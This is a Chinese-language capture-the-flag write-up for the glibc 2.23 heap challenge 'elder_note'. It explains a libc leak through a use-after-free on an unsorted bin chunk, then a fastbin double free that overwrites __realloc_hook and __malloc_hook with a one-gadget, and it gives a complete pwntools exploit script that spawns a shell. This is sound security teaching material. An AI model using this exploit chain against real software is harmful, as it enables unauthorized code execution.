# elder_note

## 题目简述

题目运行在 glibc 2.23，提供 note 的申请、查看与释放功能，单次最大可申请 `0x100` 字节。释放后的指针没有清空，可以形成 UAF 和 fastbin double free；目标是先泄露 libc，再同时劫持相邻的 `__realloc_hook` 与 `__malloc_hook` 获得 shell。

## 解题过程

先申请一个 `0x100` 的 chunk 和两个 `0x68` 的 fastbin chunk。释放大 chunk 后，它进入 unsorted bin，其用户区会留下 main arena 指针；通过 UAF 的 `show(0)` 泄露该指针，可以按 `__malloc_hook + 0x68` 计算 libc 基址。

```text
libc_base = leak - __malloc_hook - 0x68
```

随后按 `free(1) -> free(2) -> free(1)` 构造 fastbin 环。下一次取出重复的 chunk 时，把其 `fd` 改成 `__malloc_hook - 0x23`，即可让后续分配落在 hook 前方的伪造 fastbin chunk 上。

直接把 `__malloc_hook` 改成 one-gadget 往往无法满足栈约束。glibc 2.23 中 `__realloc_hook` 位于 `__malloc_hook` 前 8 字节，因此从伪造 chunk 写入：

```text
padding              -> 0x0b 字节
__realloc_hook       -> one_gadget
__malloc_hook        -> __libc_realloc + 0x10
```

调用 `malloc` 后先跳到 `realloc + 0x10`。该位置执行 `sub rsp, 0x38` 调整栈，再调用 `__realloc_hook`，从而为 one-gadget 创造更合适的约束环境。

完整利用脚本如下；原服务端口已经失效，复现时需要替换 `HOST`、`PORT` 和随题提供的 libc 文件。

```python
#!/usr/bin/env python3
import hashlib
import string

from pwn import *
from pwnlib.util.iters import mbruteforce

HOST = "example.invalid"
PORT = 0

context.log_level = "debug"
libc = ELF("./libc-2.23.so", checksec=False)
io = remote(HOST, PORT)

io.recvuntil(b") == ")
digest = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == digest,
    string.printable,
    4,
    method="fixed",
)
io.sendlineafter(b"????> ", proof.encode())

def add(index, size, content):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(index).encode())
    io.sendlineafter(b">> ", str(size).encode())
    io.sendafter(b">> ", content)

def show(index):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", str(index).encode())

def delete(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b">> ", str(index).encode())

add(0, 0x100, b"A" * 0x100)
add(1, 0x68, b"B" * 0x68)
add(2, 0x68, b"C" * 0x68)

delete(0)
show(0)
leak = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = leak - libc.sym["__malloc_hook"] - 0x68
log.success("libc base: %#x", libc.address)

malloc_hook = libc.sym["__malloc_hook"]
realloc = libc.sym["__libc_realloc"]
one_gadget = libc.address + 0x4527A

delete(1)
delete(2)
delete(1)

add(0, 0x68, p64(malloc_hook - 0x23))
add(0, 0x68, b"\n")
add(0, 0x68, b"\n")
add(0, 0x68, b"A" * 0x0B + p64(one_gadget) + p64(realloc + 0x10))

# 再触发一次 malloc；按照原程序提示输入目标索引即可进入 hook。
io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", b"0")
io.interactive()
```

## 方法总结

利用链由三个部分组成：unsorted bin 残留指针泄露 libc、fastbin double free 把分配位置导向 hook、借 `realloc + 0x10` 调整栈后执行 one-gadget。最后一步不是装饰性的跳板；若忽略 one-gadget 的寄存器和栈约束，即使成功覆盖 `__malloc_hook` 也可能只得到崩溃。
